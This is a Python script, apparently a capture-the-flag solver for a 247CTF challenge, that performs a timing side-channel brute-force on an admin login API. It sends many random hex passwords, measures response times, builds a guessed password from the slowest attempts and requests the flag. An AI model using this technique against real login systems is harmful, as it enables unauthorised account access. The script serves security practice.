#!/usr/bin/env python3
import requests
import time
import random

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    return data["message"].split("reset to ")[1].rstrip("!")

def try_login(password, api_token):
    start = time.time()
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": "admin", "password": password, "api": api_token},
        timeout=10)
    return resp.json(), time.time() - start

def get_flag(password):
    resp = requests.post(f"{BASE_URL}/api/get_flag",
        data={"password": password}, timeout=10)
    return resp.json()

# Nueva estrategia: hacer muestreo aleatorio y buscar patrones
# En lugar de ir posición por posición, probar passwords semi-aleatorias
# y ver cuáles tienen timing más alto

while True:
    api_token = get_token()
    
    # Generar 128 passwords semi-aleatorias y medir tiempos
    password_timings = []
    
    for i in range(120):
        # Generar password aleatoria
        test_pw = ''.join(random.choice(HEX_CHARS) for _ in range(32))
        result, elapsed = try_login(test_pw, api_token)
        password_timings.append((test_pw, elapsed))
        
        if result.get("result") == "success":
            flag_result = get_flag(test_pw)
            print(flag_result.get("flag", flag_result))
            exit(0)
    
    # Ordenar por timing y analizar los top 10
    password_timings.sort(key=lambda x: x[1], reverse=True)
    
    # Analizar qué caracteres aparecen más en las passwords con mayor timing
    char_frequency = [{} for _ in range(32)]
    
    for pw, timing in password_timings[:20]:  # Top 20 passwords
        for pos, char in enumerate(pw):
            if char not in char_frequency[pos]:
                char_frequency[pos][char] = 0
            char_frequency[pos][char] += timing  # Weighted by timing
    
    # Construir password basada en los caracteres más frecuentes (ponderados)
    best_password = ""
    for pos in range(32):
        if char_frequency[pos]:
            best_char = max(char_frequency[pos].items(), key=lambda x: x[1])[0]
            best_password += best_char
        else:
            best_password += "0"
    
    # Probar esta password
    flag_result = get_flag(best_password)
    if "flag" in str(flag_result).lower():
        print(flag_result.get("flag", flag_result))
        exit(0)
